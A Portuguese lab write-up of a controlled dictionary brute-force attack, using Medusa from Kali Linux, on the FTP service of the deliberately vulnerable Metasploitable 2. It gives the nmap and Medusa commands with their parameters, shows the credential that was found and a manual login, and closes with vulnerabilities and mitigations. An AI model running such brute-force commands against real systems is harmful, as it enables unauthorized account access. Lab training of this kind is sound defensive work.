# 02 — Ataque de Força Bruta em FTP com Medusa

## 1. Objetivo

Este documento descreve a execução de um ataque controlado de força bruta contra o serviço FTP da máquina vulnerável Metasploitable 2, utilizando Kali Linux e Medusa.

O objetivo é demonstrar como credenciais fracas podem ser exploradas em serviços de autenticação e quais medidas defensivas mitigam esse risco.

> Todos os testes foram realizados em ambiente local, isolado e autorizado, exclusivamente para fins educacionais.

---

## 2. Escopo do Teste

| Item | Descrição |
|---|---|
| Máquina atacante | Kali Linux |
| Máquina alvo | Metasploitable 2 |
| Ferramenta principal | Medusa |
| Serviço testado | FTP |
| Porta | 21/TCP |
| Tipo de ataque | Brute force por dicionário |
| Rede | Host-Only / ambiente local controlado |

IP utilizado no laboratório:

```
192.168.56.101
```

---

## 3. Verificação do Serviço FTP

Antes do ataque, confirmou-se que o serviço FTP estava ativo:

```bash
nmap -sV -p 21 192.168.56.101
```

Resultado esperado:

```
21/tcp open  ftp  vsftpd 2.3.4
```

---

## 4. Execução do Ataque

### Comando utilizado:

```bash
medusa -h 192.168.56.101 -u msfadmin -P wordlists/passwords.txt -M ftp -f -O logs/ftp-results.txt
```

### Parâmetros explicados:

| Parâmetro | Função |
|---|---|
| `-h 192.168.56.101` | IP do alvo |
| `-u msfadmin` | Usuário fixo testado |
| `-P wordlists/passwords.txt` | Lista de senhas |
| `-M ftp` | Módulo FTP do Medusa |
| `-f` | Para ao encontrar a primeira credencial válida |
| `-O logs/ftp-results.txt` | Salva resultado em arquivo de log |

---

## 5. Resultado

Credencial válida identificada na lista de senhas. O Medusa retornou a mensagem:

```
ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

---

## 6. Validação do Acesso

Após encontrar a credencial, o acesso foi validado manualmente:

```bash
ftp 192.168.56.101
```

```
Name: msfadmin
Password: msfadmin
230 Login successful.
ftp> pwd
ftp> ls
```

---

## 7. Vulnerabilidades Identificadas

- Senha igual ao nome de usuário (trivialmente previsível)
- Ausência de rate limiting no serviço FTP
- Nenhum bloqueio após tentativas falhas consecutivas
- FTP sem criptografia (credenciais trafegam em texto claro)

---

## 8. Mitigação

- Substituir FTP por SFTP ou FTPS
- Desabilitar autenticação por senha, usar chave SSH
- Implementar fail2ban para bloquear IPs após falhas repetidas
- Remover contas com senhas padrão ou fracas
- Restringir acesso FTP por regras de firewall
